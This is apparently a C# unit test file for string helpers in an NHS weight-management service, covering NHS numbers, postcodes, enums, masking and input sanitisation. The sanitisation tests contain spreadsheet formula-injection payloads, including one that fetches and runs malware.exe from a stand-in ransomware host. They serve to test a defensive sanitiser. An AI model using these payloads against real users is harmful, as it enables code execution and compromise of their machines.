using System;
using System.Collections.Generic;
using FluentAssertions;
using WmsHub.Common.Attributes;
using WmsHub.Common.Exceptions;
using WmsHub.Common.Extensions;
using WmsHub.Common.Helpers;
using WmsHub.Tests.Helper;
using Xunit;

namespace WmsHub.Common.Tests;

public class StringExtensionsTests : ATheoryData
{
  public class IsNhsNumber : StringExtensionsTests
  {
    [Theory]
    [InlineData("1234567890", false)]
    [InlineData("484-694-9656", false)]
    [InlineData("484 694 9656", false)]
    [InlineData("1234", false)]
    [InlineData("9998069998", true)]
    [InlineData("9995209993", true)]
    [InlineData("9993239992", true)]
    [InlineData("9998729998", true)]
    [InlineData("9992109998", true)]
    [InlineData("9999659993", true)]
    [InlineData("9994659995", true)]
    [InlineData("9993989991", true)]
    [InlineData("9992469994", true)]
    public void TestIsNhsNumber(string nhsNumber, bool expected)
    {
      // Arrange.
      NhsNumberAttribute nhsNumberAttribute = new();

      // Act.
      bool result = nhsNumberAttribute.IsValid(nhsNumber);

      // Assert.
      result.Should().Be(expected);
    }

    [Fact]
    public void NhsGeneratorTest()
    {
      // Arrange.
      NhsNumberAttribute testClass = new();
      string nhsNumber = Generators.GenerateNhsNumber(new Random());

      // Act.
      bool result = testClass.IsValid(nhsNumber);

      // Assert.
      result.Should().BeTrue();
    }
  }

  public class IsPostcode : StringExtensionsTests
  {
    [Theory]
    [InlineData(null)]
    [InlineData("")]
    [InlineData(" ")]
    [InlineData(" A")]
    [InlineData("A")]
    [InlineData("AA")]
    [InlineData("AA1")]
    [InlineData("AA1 ")]
    [InlineData("AA1 1")]
    [InlineData("AA1 X")]
    [InlineData("AA1 1A")]
    [InlineData("AA1 1A A")]
    [InlineData("AA1 1AA A")]
    [InlineData(" AA1 1AA ")]
    public void Invalid(string postcode)
    {
      // Act.
      bool result = postcode.IsPostcode();

      // Assert.
      result.Should().BeFalse();
    }

    [Theory]
    [InlineData("AA1 1AA")]
    [InlineData("BB11 1BB")]
    public void Valid(string postcode)
    {
      // Act.
      bool result = postcode.IsPostcode();

      // Assert.
      result.Should().BeTrue();
    }
  }

  public class ConvertToPostcode : StringExtensionsTests
  {
    [Theory]
    [InlineData(null)]
    [InlineData("")]
    [InlineData(" ")]
    [InlineData(" A")]
    [InlineData("A")]
    [InlineData("AA")]
    [InlineData("AA1")]
    [InlineData("AA1 ")]
    [InlineData("AA1 1")]
    [InlineData("AA1 X")]
    [InlineData("AA1 1A")]
    [InlineData("AA1 1A A")]
    [InlineData("A A1 1A A")]
    public void Invalid(string postcode)
    {
      // Act.
      postcode = postcode.ConvertToPostcode();

      // Assert.
      postcode.Should().BeNull($"{postcode} is invalid");
    }

    [Theory]
    [InlineData("ZZ99", "ZZ99 3CZ")]
    [InlineData("AA1 1AA A", "AA1 1AA")]
    [InlineData(" AA1 1AA ", "AA1 1AA")]
    [InlineData(
      "AA11 1AA 111 111 1111 The service can be found within e‐referral",
      "AA11 1AA")]
    public void Valid(string potentialPostcode, string expectedPostcode)
    {
      // Act.
      potentialPostcode = potentialPostcode.ConvertToPostcode();

      // Assert.
      potentialPostcode.Should().Be(expectedPostcode);
    }
  }

  public class ConvertToNoSpaceUpperPostcode : StringExtensionsTests
  {
    [Fact]
    public void Null_Allowed_ReturnsUnchanged()
    {
      // Arrange.
      bool allowNulls = true;
      string postcode = null;

      // Act.
      string output = postcode.ConvertToNoSpaceUpperPostcode(allowNulls);

      // Assert.
      output.Should().Be(postcode);
    }

    [Fact]
    public void Null_NotAllowed_ThrowsException()
    {
      // Arrange.
      bool allowNulls = false;
      string postcode = null;

      try
      {
        // Act.
        postcode.ConvertToNoSpaceUpperPostcode(allowNulls);
      }
      catch (Exception ex)
      {
        // Assert.
        ex.Should().BeOfType<ArgumentNullOrWhiteSpaceException>()
          .Subject.ParamName.Should().Be("postcode");
      }
    }

    [Theory]
    [InlineData("aa11aa")]
    [InlineData("aa1 1aa")]
    [InlineData(" aa1  1aa ")]
    public void ValidInput_ReturnsWithNoSpacesAndUpper(string postcode)
    {
      // Arrange.
      string expectedOutput = "AA11AA";

      // Act.
      string output = postcode.ConvertToNoSpaceUpperPostcode();

      // Assert.
      output.Should().Be(expectedOutput);
    }

    [Theory]
    [InlineData("", true)]
    [InlineData("  ", true)]
    [InlineData("", false)]
    [InlineData("  ", false)]
    public void WhiteSpaceOrEmpty_ThrowsException(string postcode, bool allowNulls)
    {
      // Arrange.

      try
      {
        // Act.
        string output = postcode.ConvertToNoSpaceUpperPostcode(allowNulls);
      }
      catch (Exception ex)
      {
        // Assert.
        ex.Should().BeOfType<ArgumentNullOrWhiteSpaceException>()
          .Subject.ParamName.Should().Be("postcode");
      }
    }
  }

  public class ExtractEmailDomain : StringExtensionsTests
  {
    [Theory]
    [MemberData(nameof(NullOrWhiteSpaceTheoryData))]
    public void EmailIsNullOrWhiteSpace_Null(string email)
    {
      // Act.
      string result = email.ExtractEmailDomain();

      // Assert.
      result.Should().BeNull();
    }

    [Fact]
    public void EmailDoesNotContainAtCharacter_Null()
    {
      // Arrange.
      string email = "test.no.domain.nhs.net";

      // Act.
      string result = email.ExtractEmailDomain();

      // Assert.
      result.Should().BeNull();
    }

    [Fact]
    public void EmailAtCharacterAtEnd_Null()
    {
      // Arrange.
      string email = "at.character.at.end@";

      // Act.
      string result = email.ExtractEmailDomain();

      // Assert.
      result.Should().BeNull();
    }

    [Theory]
    [InlineData("one@at.character.net", "at.character.net")]
    [InlineData("two@at.characters@nhs.net", "nhs.net")]
    public void EmailContainsOneOrTwoAtCharacters_Domain(
      string email,
      string expectedDomain)
    {
      // Act.
      string result = email.ExtractEmailDomain();

      // Assert.
      result.Should().Be(expectedDomain);
    }
  }

  public class ToEnumNameTests : StringExtensionsTests
  {
    public enum TestEnum:int
    {
      Undefined = 0,
      Foo = 1,
      Bar = 2
    }

    [InlineData("Undefined", TestEnum.Undefined)]
    [InlineData("Foo", TestEnum.Foo)]
    [InlineData("Bar", TestEnum.Bar)]
    [InlineData("Rubbish", TestEnum.Undefined)]
    [Theory]
    public void ValidEnum(string testEnum, TestEnum expectedParsedEnum)
    {
      // Act.
      TestEnum result = testEnum.ToEnum<TestEnum>();

      // Assert.
      result.Should().Be(expectedParsedEnum);
    }

    [InlineData("undeFined")]
    [InlineData("UNDEFINED")]
    [InlineData("foo")]
    [InlineData("No")]
    [InlineData("2147483648")]
    [Theory]
    public void InvalidEnum_Exception(string testEnum)
    {
      // Arrange.
      string expectedExceptionMessage = "value is not one of the named " +
                                        "constants defined for the enumeration.";

      // Act.
      Exception ex = Record.Exception(() => testEnum.ParseToEnumName<TestEnum>());

      // Assert.
      ex.Should().BeOfType<ArgumentException>();
      ex.Message.Should().Be(expectedExceptionMessage);
    }
  }

  public class ParseToEnumNameTests : StringExtensionsTests
  {
    public enum TestEnum
    {
      Undefined,
      Foo,
      Bar
    }

    [InlineData("Undefined", TestEnum.Undefined)]
    [InlineData("Foo", TestEnum.Foo)]
    [InlineData("Bar", TestEnum.Bar)]
    [Theory]
    public void ValidEnum(string testEnum, TestEnum expectedParsedEnum)
    {
      // Act.
      TestEnum result = testEnum.ParseToEnumName<TestEnum>();

      // Assert.
      result.Should().Be(expectedParsedEnum);
    }

    [InlineData("undeFined")]
    [InlineData("UNDEFINED")]
    [InlineData("foo")]
    [InlineData("No")]
    [InlineData("2147483648")]
    [Theory]
    public void InvalidEnum_Exception(string testEnum)
    {
      // Arrange.
      string expectedExceptionMessage = "value is not one of the named " +
        "constants defined for the enumeration.";

      // Act.
      Exception ex = Record.Exception(() => testEnum.ParseToEnumName<TestEnum>());

      // Assert.
      ex.Should().BeOfType<ArgumentException>();
      ex.Message.Should().Be(expectedExceptionMessage);
    }
  }

  public class TryParseToEnumTests : StringExtensionsTests
  {
    public enum TestEnum
    {
      Undefined,
      Foo,
      Bar
    }

    [InlineData("Undefined", TestEnum.Undefined)]
    [InlineData("Foo", TestEnum.Foo)]
    [InlineData("Bar", TestEnum.Bar)]
    [Theory]
    public void ValidEnum(string testEnum, TestEnum expectedParsedEnum)
    {
      // Act.
      bool result = testEnum.TryParseToEnumName(out TestEnum parsedEnum);

      // Assert.
      result.Should().BeTrue();
      parsedEnum.Should().Be(expectedParsedEnum);
    }

    [InlineData("undeFined", TestEnum.Undefined)]
    [InlineData("UNDEFINED", TestEnum.Undefined)]
    [InlineData("foo", TestEnum.Foo)]
    [InlineData("bar", TestEnum.Bar)]
    [Theory]
    public void InvalidEnum_Case_Incorrect(
      string testEnum, TestEnum expectedParsedEnum)
    {
      // Act.
      bool result = testEnum.TryParseToEnumName(out TestEnum parsedEnum);

      // Assert.
      result.Should().BeFalse();
      parsedEnum.Should().Be(expectedParsedEnum);
    }

    [InlineData("No")]
    [InlineData("1")]
    [InlineData("2147483648")]
    [Theory]
    public void InvalidEnum(string testEnum)
    {
      // Act.
      bool result = testEnum.TryParseToEnumName(out TestEnum parsedEnum);

      // Assert.
      result.Should().BeFalse();
      parsedEnum.Should().Be(TestEnum.Undefined);
    }
  }

  public class TryParseIpWhitelistTests : StringExtensionsTests
  {
    [Fact]
    public void TestValidIpAddress()
    {
      //Arrange
      string[] whiteList = new[]
        {"129.168.0.1", "127.0.0.1", "::1", "192.168.0.10-20"};
      string ipAddress = "192.168.0.15";
      //Act
      List<string> ipv4totest = whiteList.TryParseIpWhitelist();
      //Assert
      ipv4totest.Should().Contain(ipAddress);
    }
  }

  public class SanitizeInputTests : StringExtensionsTests
  {
    [Theory]
    [InlineData("=HYPERLINK(\"http://MyEvilSite.com\" \"&B1, \"Click me\")",
      "HYPERLINK(\"http://MyEvilSite.com\" \"&B1, \"Click me\")")]
    [InlineData("@=HYPERLINK(\"http://MyEvilSite.com\" \"&B1, \"Click me\")",
      "HYPERLINK(\"http://MyEvilSite.com\" \"&B1, \"Click me\")")]
    [InlineData("==HYPERLINK(\"http://MyEvilSite.com\" \"&B1, \"Click me\")",
      "HYPERLINK(\"http://MyEvilSite.com\" \"&B1, \"Click me\")")]
    [InlineData("=cmd|’/C ping -t 172.0.0.1 -l 25152’!’A1'",
      "cmd|’/C ping -t 172.0.0.1 -l 25152’!’A1'")]
    [InlineData("+=cmd|’/C ping -t 172.0.0.1 -l 25152’!’A1'",
      "cmd|’/C ping -t 172.0.0.1 -l 25152’!’A1'")]
    [InlineData("-=cmd|’/C ping -t 172.0.0.1 -l 25152’!’A1'",
      "cmd|’/C ping -t 172.0.0.1 -l 25152’!’A1'")]
    [InlineData("!\"$%^&*()<>", "!\"&()")]
    [InlineData("\"[InlineData(\"My doctor & Nurse\")]\"", 
      "\"[InlineData(\"My doctor & Nurse\")]\"")]
    [InlineData("=cmd|'/C powershell IEX(wget myransomwaresite.com/malware.exe)'!A0", 
      "cmd|'/C powershell IEX(wget myransomwaresite.com/malware.exe)'!A0")]
    [InlineData("0x0D,\"=2+5+cmd|' /C calc'!A0\"\"", ",\"=2+5+cmd|' /C calc'!A0\"\"")]
    [InlineData("0x07,\"=2+5+cmd|' /C calc'!A0\"\"", ",\"=2+5+cmd|' /C calc'!A0\"\"")]
    [InlineData("0x09,\"=2+5+cmd|' /C calc'!A0\"\"", "0x09,\"=2+5+cmd|' /C calc'!A0\"\"")]
    public void TestStrippedValues(string input, string expected)
    {
      // Act.
      string result = input.SanitizeInput();

      // Assert.
      result.Should().Be(expected);
    }
  }

  public class Mask : StringExtensionsTests
  {
    [Theory]
    [InlineData("+4412345678901", '*', 4, "**********8901")]
    [InlineData("1234", 'x', 4, "1234")]
    [InlineData("1234", 'x', 5, "1234")]
    [InlineData("1234", 'x', 0, "xxxx")]
    [InlineData("", 'x', 5, "")]
    [InlineData(null, 'x', 5, null)]
    public void Valid(
      string value, char maskWith, int showLast, string expected)
    {
      string result = value.Mask(maskWith, showLast);

      result.Should().Be(expected);
    }

    [Theory]
    [InlineData("1234", 'x', -1)]
    public void Invalid(string value, char maskWith, int showLast)
    {
     
      Assert.Throws<ArgumentOutOfRangeException>(
        () => value.Mask(maskWith, showLast));

    }
  }

  public class EnsureEndsWithForwardSlash : StringExtensionsTests
  {
    [Fact]
    public void Null_ReturnsNull()
    {
      // Arrange.
      string testValue = null;

      // Act.
      string result = testValue.EnsureEndsWithForwardSlash();

      // Assert.
      result.Should().BeNull();
    }

    [Fact]
    public void BlankString_ReturnsForwardSlash()
    {
      // Arrange.
      string testValue = "";

      // Act.
      string result = testValue.EnsureEndsWithForwardSlash();

      // Assert.
      result.Should().Be("/");
    }

    [Fact]
    public void StringWithoutSlashAtEnd_ReturnsStringWithSlashAtEnd()
    {
      // Arrange.
      string testValue = "https://test.com";

      // Act.
      string result = testValue.EnsureEndsWithForwardSlash();

      // Assert.
      result.Should().Be("https://test.com/");
    }

    [Fact]
    public void StringWithSlashAtEnd_ReturnsUnchangedString()
    {
      // Arrange.
      string testValue = "https://test.com/";

      // Act.
      string result = testValue.EnsureEndsWithForwardSlash();

      // Assert.
      result.Should().Be(testValue);
    }
  }
}
